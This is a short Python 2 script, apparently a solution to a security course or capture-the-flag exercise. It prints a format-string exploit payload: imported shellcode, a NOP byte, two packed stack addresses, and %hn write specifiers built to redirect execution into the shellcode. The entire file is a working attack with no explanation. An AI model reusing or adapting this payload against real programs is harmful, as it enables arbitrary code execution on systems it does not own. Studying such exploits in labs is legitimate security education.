from shellcode import shellcode
from struct import pack

def main():
	print shellcode + "\x90" + pack("<I", 0xbffe944c) + pack("<I", 0xbffe944e) + "%35872x%10$hn%13246x%11$hn"

if __name__ == '__main__':
	main()
